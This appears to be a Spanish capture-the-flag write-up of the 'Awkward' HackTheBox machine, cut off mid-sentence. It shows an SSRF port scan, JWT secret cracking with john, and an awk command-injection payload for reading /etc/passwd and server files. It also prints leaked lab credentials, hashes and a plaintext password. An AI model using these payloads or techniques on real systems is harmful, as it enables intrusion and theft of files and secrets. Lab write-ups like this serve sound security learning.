/\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.4.1-dev ________________________________________________ :: Method : GET :: URL : http://hat-valley.htb/api/store-status?url=\u0026#34;http://127.0.0.1:FUZZ\u0026#34; :: Wordlist : FUZZ: num.txt :: Header : Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjcwMTA0MjgwfQ.7ElBGGx3YjXFTkaCRTMsuWRpluCgUdZ2DhcwWRFA-4A :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500 :: Filter : Response size: 0 ________________________________________________ 80 [Status: 200, Size: 132, Words: 6, Lines: 9, Duration: 72ms] 3002 [Status: 200, Size: 77010, Words: 5916, Lines: 686, Duration: 176ms] 8080 [Status: 200, Size: 2881, Words: 305, Lines: 55, Duration: 280ms] :: Progress: [65535/65535] :: Job [1/1] :: 234 req/sec :: Duration: [0:05:11] :: Errors: 0 :: ➜ awkward En el puerto 3002 observamos la documentación de la API.\nEn 8080 la aplicación web.\nAPI - Codigo Fuente Se muestra de forma clara por medio del navegador toda la documentación y codigo de la API.\n1 http://hat-valley.htb/api/store-status?url=%22http://127.0.0.1:3002%22 /api/login\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 app.post(\u0026#39;/api/login\u0026#39;, (req, res) =\u0026gt; { const {username, password} = req.body connection.query( \u0026#39;SELECT * FROM users WHERE username = ? AND password = ?\u0026#39;, [ username, sha256(password) ], function (err, results) { if(err) { return res.status(401).send(\u0026#34;Incorrect username or password\u0026#34;) } else { if(results.length !== 0) { const userForToken = { username: results[0].username } const firstName = username.split(\u0026#34;.\u0026#34;)[0][0].toUpperCase() + username.split(\u0026#34;.\u0026#34;)[0].slice(1).toLowerCase() const token = jwt.sign(userForToken, TOKEN_SECRET) const toReturn = { \u0026#34;name\u0026#34;: firstName, \u0026#34;token\u0026#34;: token } return res.status(200).json(toReturn) }else { return res.status(401).send(\u0026#34;Incorrect username or password\u0026#34;) } } } ); }) /api/submit-leave\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 app.post(\u0026#39;/api/submit-leave\u0026#39;, (req, res) =\u0026gt; { const {reason, start, end} = req.body const user_token = req.cookies.token var authFailed = false var user = null if(user_token) { const decodedToken = jwt.verify(user_token, TOKEN_SECRET) if(!decodedToken.username) { authFailed = true }else { user = decodedToken.username } } if(authFailed) { return res.status(401).json({Error: \u0026#34;Invalid Token\u0026#34;}) } if(!user) { return res.status(500).send(\u0026#34;Invalid user\u0026#34;) } const bad = [\u0026#34;;\u0026#34;,\u0026#34;\u0026amp;\u0026#34;,\u0026#34;|\u0026#34;,\u0026#34;\u0026gt;\u0026#34;,\u0026#34;\u0026lt;\u0026#34;,\u0026#34;*\u0026#34;,\u0026#34;?\u0026#34;,\u0026#34;`\u0026#34;,\u0026#34;$\u0026#34;,\u0026#34;(\u0026#34;,\u0026#34;)\u0026#34;,\u0026#34;{\u0026#34;,\u0026#34;}\u0026#34;,\u0026#34;[\u0026#34;,\u0026#34;]\u0026#34;,\u0026#34;!\u0026#34;,\u0026#34;#\u0026#34;] const badInUser = bad.some(char =\u0026gt; user.includes(char)); const badInReason = bad.some(char =\u0026gt; reason.includes(char)); const badInStart = bad.some(char =\u0026gt; start.includes(char)); const badInEnd = bad.some(char =\u0026gt; end.includes(char)); if(badInUser || badInReason || badInStart || badInEnd) { return res.status(500).send(\u0026#34;Bad character detected.\u0026#34;) } const finalEntry = user + \u0026#34;,\u0026#34; + reason + \u0026#34;,\u0026#34; + start + \u0026#34;,\u0026#34; + end + \u0026#34;,Pending\\r\u0026#34; exec(`echo \u0026#34;${finalEntry}\u0026#34; \u0026gt;\u0026gt; /var/www/private/leave_requests.csv`, (error, stdout, stderr) =\u0026gt; { if (error) { return res.status(500).send(\u0026#34;Failed to add leave request\u0026#34;) } return res.status(200).send(\u0026#34;Successfully added new leave request\u0026#34;) }) }) /api/all-leave\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 app.get(\u0026#39;/api/all-leave\u0026#39;, (req, res) =\u0026gt; { const user_token = req.cookies.token var authFailed = false var user = null if(user_token) { const decodedToken = jwt.verify(user_token, TOKEN_SECRET) if(!decodedToken.username) { authFailed = true }else { user = decodedToken.username } } if(authFailed) { return res.status(401).json({Error: \u0026#34;Invalid Token\u0026#34;}) } if(!user) { return res.status(500).send(\u0026#34;Invalid user\u0026#34;) } const bad = [\u0026#34;;\u0026#34;,\u0026#34;\u0026amp;\u0026#34;,\u0026#34;|\u0026#34;,\u0026#34;\u0026gt;\u0026#34;,\u0026#34;\u0026lt;\u0026#34;,\u0026#34;*\u0026#34;,\u0026#34;?\u0026#34;,\u0026#34;`\u0026#34;,\u0026#34;$\u0026#34;,\u0026#34;(\u0026#34;,\u0026#34;)\u0026#34;,\u0026#34;{\u0026#34;,\u0026#34;}\u0026#34;,\u0026#34;[\u0026#34;,\u0026#34;]\u0026#34;,\u0026#34;!\u0026#34;,\u0026#34;#\u0026#34;] const badInUser = bad.some(char =\u0026gt; user.includes(char)); if(badInUser) { return res.status(500).send(\u0026#34;Bad character detected.\u0026#34;) } exec(\u0026#34;awk \u0026#39;/\u0026#34; + user + \u0026#34;/\u0026#39; /var/www/private/leave_requests.csv\u0026#34;, {encoding: \u0026#39;binary\u0026#39;, maxBuffer: 51200000}, (error, stdout, stderr) =\u0026gt; { if(stdout) { return res.status(200).send(new Buffer(stdout, \u0026#39;binary\u0026#39;)); } if (error) { return res.status(500).send(\u0026#34;Failed to retrieve leave requests\u0026#34;) } if (stderr) { return res.status(500).send(\u0026#34;Failed to retrieve leave requests\u0026#34;) } }) }) /api/store-status\r1 2 3 4 5 6 7 8 9 app.get(\u0026#39;/api/store-status\u0026#39;, async (req, res) =\u0026gt; { await axios.get(req.query.url.substring(1, req.query.url.length-1)) .then(http_res =\u0026gt; { return res.status(200).send(http_res.data) }) .catch(http_err =\u0026gt; { return res.status(200).send(http_err.data) }) }) /api/staff-details\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 app.get(\u0026#39;/api/staff-details\u0026#39;, (req, res) =\u0026gt; { const user_token = req.cookies.token var authFailed = false if(user_token) { const decodedToken = jwt.verify(user_token, TOKEN_SECRET) if(!decodedToken.username) { authFailed = true } } if(authFailed) { return res.status(401).json({Error: \u0026#34;Invalid Token\u0026#34;}) } connection.query( \u0026#39;SELECT * FROM users\u0026#39;, function (err, results) { if(err) { return res.status(500).send(\u0026#34;Database error\u0026#34;) }else { return res.status(200).json(results) } } ); }) Reading Local Files Tras realizar un analisis del codigo, encontramos posiblemente dos vulnerabilidades en dos rutas de la API.\nPosible Command injection en /submit-leave, en esta ruta es por donde se envia un nuevo Leave, por lo que de existir alguna forma de realizar bypass sería posible inyectar comandos. Aunque esta opción no parece viable. Posible Lectura de archivos en la ruta /all-leave, observamos el uso de awk en la creación de un comando para leer un archivo .csv, realizando un \u0026ldquo;filtro\u0026rdquo; para la lectura de valores pertenecientes a cierto usuario, este usuario es sacado del token JWT, por lo que si intentamos modificar la construcción del comando, es necesario modificar el token JWT primero. Iniciamos buscando el SECRET del token JWT que posteriormente nos servirá para modificar el valor del usuario en el token para realizar la lectura de archivos.\nCracking JWT - John Utilizando john crackeamos el token JWT para encontrar el secret.\nRef. Hacking JWT Tokens 1 2 3 4 5 6 7 8 9 10 ➜ awkward john jwt.txt --wordlist=$ROCK --format=HMAC-SHA256 Using default input encoding: UTF-8 Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x]) Will run 4 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status 123beany123 (?) 1g 0:00:00:02 DONE (2022-12-03 17:14) 0.4739g/s 6320Kp/s 6320Kc/s 6320KC/s 123erix..1234ถุ Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed ➜ awkward awk + local file Basados en la construcción del comando creamos un posible payload con la ayuda de GTFOBins.\n1 2 3 4 5 # command \u0026#34;awk \u0026#39;/\u0026#34; + user + \u0026#34;/\u0026#39; /var/www/private/leave_requests.csv\u0026#34; # payload /\u0026#39; \u0026#39;/etc/passwd\u0026#39; \u0026#39; Verificamos nuestro payload.\n1 2 3 4 5 6 7 8 \u0026gt;\u0026gt;\u0026gt; user = \u0026#34;sckull\u0026#34; \u0026gt;\u0026gt;\u0026gt; print(\u0026#34;awk \u0026#39;/\u0026#34; + user + \u0026#34;/\u0026#39; file.csv\u0026#34;) awk \u0026#39;/sckull/\u0026#39; file.csv \u0026gt;\u0026gt;\u0026gt; \u0026gt;\u0026gt;\u0026gt; user = \u0026#34;/\u0026#39; \u0026#39;/etc/passwd\u0026#39; \u0026#39;\u0026#34; \u0026gt;\u0026gt;\u0026gt; print(\u0026#34;awk \u0026#39;/\u0026#34; + user + \u0026#34;/\u0026#39; file.csv\u0026#34;) awk \u0026#39;//\u0026#39; \u0026#39;/etc/passwd\u0026#39; \u0026#39;/\u0026#39; file.csv \u0026gt;\u0026gt;\u0026gt; Tras la creación y ejecución del payload localmente, logramos realizar la lectura del archivo /etc/passwd, por lo que ahora tenemos un payload para la lectura de cualquier archivo.\n1 2 3 4 sckull@kuzu:~/tmp$ awk \u0026#39;//\u0026#39; \u0026#39;/etc/passwd\u0026#39; \u0026#39;/\u0026#39; file.csv root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin [.. snip ..] Reading files Modificamos el token con el payload para realiza la lectura del archivo /etc/passwd.\nTras realizar la solicitud en /all-leave logramos obtener el contenido de dicho archivo. En este archivo encontramos los usuarios: bean y christine.\nEn el error del token observamos la ruta completa del archivo server.js, el cual logramos obtener, las credenciales no funcionan en algun servicio conocido.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 // /var/www/hat-valley.htb/server/server.js const express = require(\u0026#39;express\u0026#39;) const bodyParser = require(\u0026#39;body-parser\u0026#39;) const cors = require(\u0026#39;cors\u0026#39;) const jwt = require(\u0026#39;jsonwebtoken\u0026#39;) const app = express() const axios = require(\u0026#39;axios\u0026#39;) const { exec } = require(\u0026#34;child_process\u0026#34;); const path = require(\u0026#39;path\u0026#39;) const sha256 = require(\u0026#39;sha256\u0026#39;) const cookieParser = require(\u0026#34;cookie-parser\u0026#34;) app.use(bodyParser.json()) app.use(cors()) app.use(cookieParser()) const mysql = require(\u0026#39;mysql\u0026#39;) const { response } = require(\u0026#39;express\u0026#39;) const connection = mysql.createConnection({ host: \u0026#39;localhost\u0026#39;, user: \u0026#39;root\u0026#39;, password: \u0026#39;SQLDatabasePassword321!\u0026#39;, database: \u0026#39;hatvalley\u0026#39;, stringifyObjects: true }) const port = 3002 const TOKEN_SECRET = \u0026#34;123beany123\u0026#34; [.. ..] // check server.js tab server.js\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 // /var/www/hat-valley.htb/server/server.js const express = require(\u0026#39;express\u0026#39;) const bodyParser = require(\u0026#39;body-parser\u0026#39;) const cors = require(\u0026#39;cors\u0026#39;) const jwt = require(\u0026#39;jsonwebtoken\u0026#39;) const app = express() const axios = require(\u0026#39;axios\u0026#39;) const { exec } = require(\u0026#34;child_process\u0026#34;); const path = require(\u0026#39;path\u0026#39;) const sha256 = require(\u0026#39;sha256\u0026#39;) const cookieParser = require(\u0026#34;cookie-parser\u0026#34;) app.use(bodyParser.json()) app.use(cors()) app.use(cookieParser()) const mysql = require(\u0026#39;mysql\u0026#39;) const { response } = require(\u0026#39;express\u0026#39;) const connection = mysql.createConnection({ host: \u0026#39;localhost\u0026#39;, user: \u0026#39;root\u0026#39;, password: \u0026#39;SQLDatabasePassword321!\u0026#39;, database: \u0026#39;hatvalley\u0026#39;, stringifyObjects: true }) const port = 3002 const TOKEN_SECRET = \u0026#34;123beany123\u0026#34; app.post(\u0026#39;/api/login\u0026#39;, (req, res) =\u0026gt; { const {username, password} = req.body connection.query( \u0026#39;SELECT * FROM users WHERE username = ? AND password = ?\u0026#39;, [ username, sha256(password) ], function (err, results) { if(err) { return res.status(401).send(\u0026#34;Incorrect username or password\u0026#34;) } else { if(results.length !== 0) { const userForToken = { username: results[0].username } const firstName = username.split(\u0026#34;.\u0026#34;)[0][0].toUpperCase() + username.split(\u0026#34;.\u0026#34;)[0].slice(1).toLowerCase() const token = jwt.sign(userForToken, TOKEN_SECRET) const toReturn = { \u0026#34;name\u0026#34;: firstName, \u0026#34;token\u0026#34;: token } return res.status(200).json(toReturn) } else { return res.status(401).send(\u0026#34;Incorrect username or password\u0026#34;) } } } ); }) app.post(\u0026#39;/api/submit-leave\u0026#39;, (req, res) =\u0026gt; { const {reason, start, end} = req.body const user_token = req.cookies.token var authFailed = false var user = null if(user_token) { const decodedToken = jwt.verify(user_token, TOKEN_SECRET) if(!decodedToken.username) { authFailed = true } else { user = decodedToken.username } } if(authFailed) { return res.status(401).json({Error: \u0026#34;Invalid Token\u0026#34;}) } if(!user) { return res.status(500).send(\u0026#34;Invalid user\u0026#34;) } const bad = [\u0026#34;;\u0026#34;,\u0026#34;\u0026amp;\u0026#34;,\u0026#34;|\u0026#34;,\u0026#34;\u0026gt;\u0026#34;,\u0026#34;\u0026lt;\u0026#34;,\u0026#34;*\u0026#34;,\u0026#34;?\u0026#34;,\u0026#34;`\u0026#34;,\u0026#34;$\u0026#34;,\u0026#34;(\u0026#34;,\u0026#34;)\u0026#34;,\u0026#34;{\u0026#34;,\u0026#34;}\u0026#34;,\u0026#34;[\u0026#34;,\u0026#34;]\u0026#34;,\u0026#34;!\u0026#34;,\u0026#34;#\u0026#34;] //https://www.slac.stanford.edu/slac/www/resource/how-to-use/cgi-rexx/cgi-esc.html const badInUser = bad.some(char =\u0026gt; user.includes(char)); const badInReason = bad.some(char =\u0026gt; reason.includes(char)); const badInStart = bad.some(char =\u0026gt; start.includes(char)); const badInEnd = bad.some(char =\u0026gt; end.includes(char)); if(badInUser || badInReason || badInStart || badInEnd) { return res.status(500).send(\u0026#34;Bad character detected.\u0026#34;) } const finalEntry = user + \u0026#34;,\u0026#34; + reason + \u0026#34;,\u0026#34; + start + \u0026#34;,\u0026#34; + end + \u0026#34;,Pending\\r\u0026#34; exec(`echo \u0026#34;${finalEntry}\u0026#34; \u0026gt;\u0026gt; /var/www/private/leave_requests.csv`, (error, stdout, stderr) =\u0026gt; { if (error) { return res.status(500).send(\u0026#34;Failed to add leave request\u0026#34;) } return res.status(200).send(\u0026#34;Successfully added new leave request\u0026#34;) }) }) app.get(\u0026#39;/api/all-leave\u0026#39;, (req, res) =\u0026gt; { const user_token = req.cookies.token var authFailed = false var user = null if(user_token) { const decodedToken = jwt.verify(user_token, TOKEN_SECRET) if(!decodedToken.username) { authFailed = true } else { user = decodedToken.username } } if(authFailed) { return res.status(401).json({Error: \u0026#34;Invalid Token\u0026#34;}) } if(!user) { return res.status(500).send(\u0026#34;Invalid user\u0026#34;) } const bad = [\u0026#34;;\u0026#34;,\u0026#34;\u0026amp;\u0026#34;,\u0026#34;|\u0026#34;,\u0026#34;\u0026gt;\u0026#34;,\u0026#34;\u0026lt;\u0026#34;,\u0026#34;*\u0026#34;,\u0026#34;?\u0026#34;,\u0026#34;`\u0026#34;,\u0026#34;$\u0026#34;,\u0026#34;(\u0026#34;,\u0026#34;)\u0026#34;,\u0026#34;{\u0026#34;,\u0026#34;}\u0026#34;,\u0026#34;[\u0026#34;,\u0026#34;]\u0026#34;,\u0026#34;!\u0026#34;,\u0026#34;#\u0026#34;] //https://www.slac.stanford.edu/slac/www/resource/how-to-use/cgi-rexx/cgi-esc.html const badInUser = bad.some(char =\u0026gt; user.includes(char)); if(badInUser) { return res.status(500).send(\u0026#34;Bad character detected.\u0026#34;) } exec(\u0026#34;awk \u0026#39;/\u0026#34; + user + \u0026#34;/\u0026#39; /var/www/private/leave_requests.csv\u0026#34;, {encoding: \u0026#39;binary\u0026#39;, maxBuffer: 51200000}, (error, stdout, stderr) =\u0026gt; { if(stdout) { return res.status(200).send(new Buffer(stdout, \u0026#39;binary\u0026#39;)); } if (error) { return res.status(500).send(\u0026#34;Failed to retrieve leave requests\u0026#34;) } if (stderr) { return res.status(500).send(\u0026#34;Failed to retrieve leave requests\u0026#34;) } }) }) app.get(\u0026#39;/api/store-status\u0026#39;, async (req, res) =\u0026gt; { await axios.get(req.query.url.substring(1, req.query.url.length-1)) .then(http_res =\u0026gt; { return res.status(200).send(http_res.data) }) .catch(http_err =\u0026gt; { return res.status(200).send(http_err.data) }) }) app.get(\u0026#39;/api/staff-details\u0026#39;, (req, res) =\u0026gt; { const user_token = req.cookies.token var authFailed = false if(user_token) { const decodedToken = jwt.verify(user_token, TOKEN_SECRET) if(!decodedToken.username) { authFailed = true } } if(authFailed) { return res.status(401).json({Error: \u0026#34;Invalid Token\u0026#34;}) } connection.query( \u0026#39;SELECT * FROM users\u0026#39;, function (err, results) { if(err) { return res.status(500).send(\u0026#34;Database error\u0026#34;) } else { return res.status(200).json(results) } } ); }) app.get(\u0026#39;/\u0026#39;, (req, res) =\u0026gt; { res.sendFile(path.join(__dirname+\u0026#39;/readme.html\u0026#39;)) }) app.listen(port, \u0026#39;localhost\u0026#39;, () =\u0026gt; { console.log(`Server listening on port ${port}`) connection.connect() }) Asi mismo logramos adivinar la ruta del archivo de configuración nginx del subdominio, donde observamos la ruta del archivo .htpasswd.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 /etc/nginx/sites-available/store.conf server { listen 80; server_name store.hat-valley.htb; root /var/www/store; location / { index index.php index.html index.htm; } # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000 # location ~ /cart/.*\\.php$ { return 403; } location ~ /product-details/.*\\.php$ { return 403; } location ~ \\.php$ { auth_basic \u0026#34;Restricted\u0026#34;; auth_basic_user_file /etc/nginx/conf.d/.htpasswd; fastcgi_pass unix:/var/run/php/php8.1-fpm.sock; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME $realpath_root$fastcgi_script_name; include fastcgi_params; } # deny access to .htaccess files, if Apache\u0026#39;s document root # concurs with nginx\u0026#39;s one # #location ~ /\\.ht { # deny all; #} } En dicho archivo encontramos el usuario y hash para acceder al sitio, sin embargo no logramos crackear el hash.\n1 admin:$apr1$lfvrwhqi$hd49MbBX3WNluMezyjWls1 Tambien, logramos enumerar distintos archivos php tras obtener el archivo index.php de /var/www/store.\n1 2 3 4 5 6 index.php shop.php cart.php checkout.php cart_actions.php # /var/www/store/cart_actions.php Observamos distintas funciones utilizadas en la \u0026ldquo;tienda\u0026rdquo; a la cual no podemos acceder.\ncart_actions.php\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 \u0026lt;?php $STORE_HOME = \u0026#34;/var/www/store/\u0026#34;; //check for valid hat valley store item function checkValidItem($filename) { if(file_exists($filename)) { $first_line = file($filename)[0]; if(strpos($first_line, \u0026#34;***Hat Valley\u0026#34;) !== FALSE) { return true; } } return false; } //add to cart if ($_SERVER[\u0026#39;REQUEST_METHOD\u0026#39;] === \u0026#39;POST\u0026#39; \u0026amp;\u0026amp; $_POST[\u0026#39;action\u0026#39;] === \u0026#39;add_item\u0026#39; \u0026amp;\u0026amp; $_POST[\u0026#39;item\u0026#39;] \u0026amp;\u0026amp; $_POST[\u0026#39;user\u0026#39;]) { $item_id = $_POST[\u0026#39;item\u0026#39;]; $user_id = $_POST[\u0026#39;user\u0026#39;]; $bad_chars = array(\u0026#34;;\u0026#34;,\u0026#34;\u0026amp;\u0026#34;,\u0026#34;|\u0026#34;,\u0026#34;\u0026gt;\u0026#34;,\u0026#34;\u0026lt;\u0026#34;,\u0026#34;*\u0026#34;,\u0026#34;?\u0026#34;,\u0026#34;`\u0026#34;,\u0026#34;$\u0026#34;,\u0026#34;(\u0026#34;,\u0026#34;)\u0026#34;,\u0026#34;{\u0026#34;,\u0026#34;}\u0026#34;,\u0026#34;[\u0026#34;,\u0026#34;]\u0026#34;,\u0026#34;!\u0026#34;,\u0026#34;#\u0026#34;); //no hacking allowed!! foreach($bad_chars as $bad) { if(strpos($item_id, $bad) !== FALSE) { echo \u0026#34;Bad character detected!\u0026#34;; exit; } } foreach($bad_chars as $bad) { if(strpos($user_id, $bad) !== FALSE) { echo \u0026#34;Bad character detected!\u0026#34;; exit; } } if(checkValidItem(\u0026#34;{$STORE_HOME}product-details/{$item_id}.txt\u0026#34;)) { if(!file_exists(\u0026#34;{$STORE_HOME}cart/{$user_id}\u0026#34;)) { system(\u0026#34;echo \u0026#39;***Hat Valley Cart***\u0026#39; \u0026gt; {$STORE_HOME}cart/{$user_id}\u0026#34;); } system(\u0026#34;head -2 {$STORE_HOME}product-details/{$item_id}.txt | tail -1 \u0026gt;\u0026gt; {$STORE_HOME}cart/{$user_id}\u0026#34;); echo \u0026#34;Item added successfully!\u0026#34;; } else { echo \u0026#34;Invalid item\u0026#34;; } exit; } //delete from cart if ($_SERVER[\u0026#39;REQUEST_METHOD\u0026#39;] === \u0026#39;POST\u0026#39; \u0026amp;\u0026amp; $_POST[\u0026#39;action\u0026#39;] === \u0026#39;delete_item\u0026#39; \u0026amp;\u0026amp; $_POST[\u0026#39;item\u0026#39;] \u0026amp;\u0026amp; $_POST[\u0026#39;user\u0026#39;]) { $item_id = $_POST[\u0026#39;item\u0026#39;]; $user_id = $_POST[\u0026#39;user\u0026#39;]; $bad_chars = array(\u0026#34;;\u0026#34;,\u0026#34;\u0026amp;\u0026#34;,\u0026#34;|\u0026#34;,\u0026#34;\u0026gt;\u0026#34;,\u0026#34;\u0026lt;\u0026#34;,\u0026#34;*\u0026#34;,\u0026#34;?\u0026#34;,\u0026#34;`\u0026#34;,\u0026#34;$\u0026#34;,\u0026#34;(\u0026#34;,\u0026#34;)\u0026#34;,\u0026#34;{\u0026#34;,\u0026#34;}\u0026#34;,\u0026#34;[\u0026#34;,\u0026#34;]\u0026#34;,\u0026#34;!\u0026#34;,\u0026#34;#\u0026#34;); //no hacking allowed!! foreach($bad_chars as $bad) { if(strpos($item_id, $bad) !== FALSE) { echo \u0026#34;Bad character detected!\u0026#34;; exit; } } foreach($bad_chars as $bad) { if(strpos($user_id, $bad) !== FALSE) { echo \u0026#34;Bad character detected!\u0026#34;; exit; } } if(checkValidItem(\u0026#34;{$STORE_HOME}cart/{$user_id}\u0026#34;)) { system(\u0026#34;sed -i \u0026#39;/item_id={$item_id}/d\u0026#39; {$STORE_HOME}cart/{$user_id}\u0026#34;); echo \u0026#34;Item removed from cart\u0026#34;; } else { echo \u0026#34;Invalid item\u0026#34;; } exit; } //fetch from cart if ($_SERVER[\u0026#39;REQUEST_METHOD\u0026#39;] === \u0026#39;GET\u0026#39; \u0026amp;\u0026amp; $_GET[\u0026#39;action\u0026#39;] === \u0026#39;fetch_items\u0026#39; \u0026amp;\u0026amp; $_GET[\u0026#39;user\u0026#39;]) { $html = \u0026#34;\u0026#34;; $dir = scandir(\u0026#34;{$STORE_HOME}cart\u0026#34;); $files = array_slice($dir, 2); foreach($files as $file) { $user_id = substr($file, -18); if($user_id === $_GET[\u0026#39;user\u0026#39;] \u0026amp;\u0026amp; checkValidItem(\u0026#34;{$STORE_HOME}cart/{$user_id}\u0026#34;)) { $product_file = fopen(\u0026#34;{$STORE_HOME}cart/{$file}\u0026#34;, \u0026#34;r\u0026#34;); $details = array(); while (($line = fgets($product_file)) !== false) { if(str_replace(array(\u0026#34;\\r\u0026#34;, \u0026#34;\\n\u0026#34;), \u0026#39;\u0026#39;, $line) !== \u0026#34;***Hat Valley Cart***\u0026#34;) { //don\u0026#39;t include first line array_push($details, str_replace(array(\u0026#34;\\r\u0026#34;, \u0026#34;\\n\u0026#34;), \u0026#39;\u0026#39;, $line)); } } foreach($details as $cart_item) { $cart_items = explode(\u0026#34;\u0026amp;\u0026#34;, $cart_item); for($x = 0; $x \u0026lt; count($cart_items); $x++) { $cart_items[$x] = explode(\u0026#34;=\u0026#34;, $cart_items[$x]); //key and value as separate values in subarray } $html .= \u0026#34;\u0026lt;tr\u0026gt;\u0026lt;td\u0026gt;{$cart_items[1][1]}\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;{$cart_items[2][1]}\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;{$cart_items[3][1]}\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;\u0026lt;button data-id={$cart_items[0][1]} onclick=\\\u0026#34;removeFromCart(this, localStorage.getItem(\u0026#39;user\u0026#39;))\\\u0026#34; class=\u0026#39;remove-item\u0026#39;\u0026gt;Remove\u0026lt;/button\u0026gt;\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt;\u0026#34;; } } } echo $html; exit; } ?\u0026gt; Backup Luego de no obtener más información relevante de archivos de configuración, enumeramos los directorios de los usuarios, encontramos en el archivo .bashrc de bean un alias que realiza la ejecución de un script en bash.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 # ~/.bashrc: executed by bash(1) for non-login shells. # see /usr/share/doc/bash/examples/startup-files (in the package bash-doc) # for examples #[.. snip ..] # some more ls aliases alias ll=\u0026#39;ls -alF\u0026#39; alias la=\u0026#39;ls -A\u0026#39; alias l=\u0026#39;ls -CF\u0026#39; # custom alias backup_home=\u0026#39;/bin/bash /home/bean/Documents/backup_home.sh\u0026#39; # Add an \u0026#34;alert\u0026#34; alias for long running commands. Use like so: # sleep 10; alert alias alert=\u0026#39;notify-send --urgency=low -i \u0026#34;$([ $? = 0 ] \u0026amp;\u0026amp; echo terminal || echo error)\u0026#34; \u0026#34;$(history|tail -n1|sed -e \u0026#39;\\\u0026#39;\u0026#39;s/^\\s*[0-9]\\+\\s*//;s/[;\u0026amp;|]\\s*alert$//\u0026#39;\\\u0026#39;\u0026#39;)\u0026#34;\u0026#39; #[.. snip ..] Si observamos el contenido de este archivo, realiza un backup del directorio de bean, se observa la ruta completa del archivo comprimido.\n1 2 3 4 5 6 7 8 #!/bin/bash mkdir /home/bean/Documents/backup_tmp cd /home/bean tar --exclude=\u0026#39;.npm\u0026#39; --exclude=\u0026#39;.cache\u0026#39; --exclude=\u0026#39;.vscode\u0026#39; -czvf /home/bean/Documents/backup_tmp/bean_backup.tar.gz . date \u0026gt; /home/bean/Documents/backup_tmp/time.txt cd /home/bean/Documents/backup_tmp tar -czvf /home/bean/Documents/backup/bean_backup_final.tar.gz . rm -r /home/bean/Documents/backup_tmp Obtuvimos el archivo comprimido, tras descomprimirlo observamos multiples carpetas y archivos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 ➜ www file backup.tar.gz backup.tar.gz: gzip compressed data, from Unix, original size modulo 2^32 167772320 ➜ www tar -xvf backup.tar.gz gzip: stdin: unexpected end of file ./ ./bean_backup.tar.gz ./time.txt tar: Child returned status 1 tar: Error is not recoverable: exiting now ➜ www ls backup.tar.gz bean_backup.tar.gz time.txt ➜ www tar -xvf bean_backup.tar.gz ./ ./Templates/ ./.ssh/ ./Pictures/ ./.config/ [.. snip ..] ./Documents/backup/ ➜ www ls backup.tar.gz bean_backup.tar.gz Desktop Documents Downloads Music Pictures Public snap Templates time.txt Videos ➜ www Enumerando el contenido de los archivos encontramos un \u0026ldquo;ToDo\u0026rdquo; donde se muestra una posible contraseña del usuario bean.hill.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 ➜ www cat .config/xpad/content-DS1ZS1 TO DO: - Get real hat prices / stock from Christine - Implement more secure hashing mechanism for HR system - Setup better confirmation message when adding item to cart - Add support for item quantity \u0026gt; 1 - Implement checkout system boldHR SYSTEM/bold bean.hill 014mrbeanrules!#P https://www.slac.stanford.edu/slac/www/resource/how-to-use/cgi-rexx/cgi-esc.html boldMAKE SURE TO USE THIS EVERYWHERE ^^^/bold% ➜ www User - Bean Hydra - Store HTTP Con nombres de 